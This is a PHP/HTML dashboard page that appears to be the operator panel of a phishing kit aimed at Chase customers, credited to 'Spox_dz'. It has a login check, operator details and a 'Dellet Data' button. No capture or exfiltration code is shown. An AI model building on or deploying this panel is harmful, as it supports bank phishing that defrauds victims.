<?php
/*ba510*/


/*ba510*/
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
#################### *-* Start Include *-* ####################
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 2.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/





if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ include 'YOUR-CONFIG.php';}
$what = $_GET['dila'];

?>

<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cawlye Tools Dashboard</title>

    <!-- Styling -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600|Raleway:400,700" rel="stylesheet">
<link href="files/admin/css/all.min248f.css?v=b4c444" rel="stylesheet">
<link href="files/admin/css/fontawesome-all.min.css" rel="stylesheet">
<link href="files/admin/css/custom.css" rel="stylesheet">
<link rel="shortcut icon" href="https://urania.icu/assets/images/logo/favicon.png">
<script src="https://kit.fontawesome.com/b7fa9575a5.js"></script>


</head>
<body data-phone-cc-input="1">



<section id="main-menu">

    <nav id="nav" class="navbar navbar-default navbar-main" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#primary-nav">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="primary-nav">

                <ul class="nav navbar-nav">

<li menuitemname="Home" class="" id="Primary_Navbar-Home">
<a href="index.php">Home</a>
</li>
<li menuitemname="Services" class="dropdown" id="Primary_Navbar-Services">

<li menuitemname="Open Ticket" class="" id="Primary_Navbar-Open_Ticket">
<a href="https://cawlye.github.io">Cawlye</a>
</li>
<li menuitemname="Affiliates" class="" id="Primary_Navbar-Affiliates">
<a href="info.php">info</a>
</li>
</ul>

<ul class="nav navbar-nav navbar-right">
<li menuitemname="Account" class="dropdown account" id="Secondary_Navbar-Account">
<a >Hello,<?php echo $yourname; ?> !&nbsp;</a>
</ul>
</li>
</ul>
</div><!-- /.navbar-collapse -->
</div>
</nav>
</section>



<section id="main-body">
<div class="container">
<div class="row">
<div class="col-md-9 pull-md-right">
<div class="header-lined">
<h1>Welcome Back, <?php echo $yourname; ?></h1>

</div>
</div>
<div class="col-md-3 pull-md-left sidebar">
<div menuitemname="Client Details" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-user"></i>&nbsp;Your Info
<i class="fas fa-chevron-up panel-minimise pull-right"></i>
</h3>
</div>
<div class="panel-body">
<strong>Hi.</strong><br><br>

<strong>Name : <a style="color:#f0ad4e">[ <?php echo $yourname; ?> ]</a></strong><br>
<strong>Email : <a style="color:#5bc0de"><?php echo $your_email; ?><a></strong><br><br><br>

<div>
<a href="index.php?dila=dellet"  class="btn btn-default bg-color-red btn-xs">
<i class="fas fa-arrow-right" aria-hidden="true"></i>Dellet Data
</a>
</div>
<style>

</style>

</div>
<div class="panel-footer clearfix">
<a href="#" class="btn btn-success btn-sm btn-block">
<i class="fas fa-pencil-alt"></i> Update
</a>
</div>
</div>
</div>
<!-- Container for main page display content -->
<div class="col-md-9 pull-md-right main-content">
            

            </a>
        </div>
    </div>
</div>

<div class="client-home-panels">
    <div class="row">
        <div class="col-sm-6">

            

                                                
<div menuitemname="Overdue Invoices" class="panel panel-default panel-accent-red">

            
                                                        

     


<div menuitemname="Client Shortcuts" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-bookmark"></i>&nbsp;Shortcuts
<i class="fas fa-chevron-up panel-minimise pull-up"></i>
</h3>
</div>
<div class="list-group">
<a menuitemname="Order New Services" href="https://facebook.com/hackeeeed.htmI" target="_blanc" class="list-group-item" id="Secondary_Sidebar-Client_Shortcuts-Order_New_Services">
<i class="fas fa-shopping-cart fa-fw"></i>&nbsp;Order New Tools
</a>
<a menuitemname="Logout" href="logout.php" class="list-group-item" id="Secondary_Sidebar-Client_Shortcuts-Logout">
<i class="fas fa-arrow-left fa-fw"></i>&nbsp;Logout
</a>
</div>
</div>
</div>
<div class="clearfix"></div>
</div>
</div>
</section>



</body>
</html>
